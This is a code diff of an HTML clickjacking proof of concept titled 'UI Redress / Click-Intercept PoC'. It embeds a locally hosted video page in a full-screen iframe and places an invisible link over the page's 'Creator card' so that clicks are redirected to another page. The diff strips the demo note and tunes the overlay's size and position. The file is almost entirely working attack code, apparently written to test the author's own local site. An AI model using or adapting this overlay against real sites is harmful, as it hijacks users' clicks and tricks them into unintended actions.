@@ -1,35 +1,43 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>UI Redress / Click-Intercept PoC</title>
 <style>
-  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#f3f4f6;display:flex;align-items:center;justify-content:center;height:100vh}
-  .frameWrap{position:relative;width:900px;height:560px;border-radius:10px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,.12)}
-  iframe#victim{width:100%;height:100%;border:0;transform:scale(1);transform-origin:top left}
-  /* Invisible interceptor exactly where Creator card appears */
-  .interceptor{
-    position:absolute;
-    /* tweak these positions so the overlay sits *on top* of the Creator card */
-    left: calc(50% + 40px); /* adjust horizontally */
-    top: calc(50% - 40px);  /* adjust vertically */
-    width: 260px; height: 220px; /* cover the card area */
-    z-index: 5;
-    background: rgba(0,0,0,0); /* invisible */
-    cursor: pointer;
+  /* ensure no page margins */
+  html,body { margin:0; padding:0; height:100%; }
+
+  /* full-viewport frame wrapper */
+  .frameWrap {
+    position:relative;
+    width:100vw;
+    height:100vh;     /* full viewport height */
+    overflow:hidden;
+    background:#fff;
   }
-  .note{position:absolute;left:8px;top:8px;background:#fff;padding:6px 10px;border-radius:6px;font-size:12px;opacity:.9}
+
+  /* iframe fills the wrapper */
+  iframe#victim {
+    width:100%;
+    height:100%;
+    border:0;
+    display:block;
+  }
+
+  /* interceptor overlay - size/position with percent coords so you can nudge it */
+  .interceptor {
+    position:absolute;
+    left:50%; top:50%;
+    width:260px; height:140px;
+    transform:translate(-50%,-50%);
+    z-index:9999;
+    pointer-events:auto;
+    background:rgba(0,0,0,0); /* remove for invisible */
+    /*border:3px dashed rgba(255,0,0,0.75);*/
+  }
 </style>
-</head>
-<body>
-  <div class="frameWrap">
-    <div class="note">Demo: clicking the visible Creator card will go to the wrong page</div>
 
-    <!-- Show your real site so the page *looks* real -->
-    <iframe id="victim" src="http://localhost:3000/Videos.html"></iframe>
+<div class="frameWrap">
+  <!--<div class="note">Demo: clicking the visible Creator card will go to the wrong page</div>-->
 
-    <!-- Invisible element on top of the Creator card that steals clicks -->
-    <a class="interceptor" href="wrong.html" target="_top" title="Click interceptor"></a>
-  </div>
-</body>
-</html>
+  <!-- Show your real site -->
+  <iframe id="victim" src="http://localhost:3000/Videos.html"></iframe>
+
+  <!-- Invisible interceptor -->
+  <a class="interceptor" href="wrong.html" target="_top" title="Click interceptor"></a>
+</div>
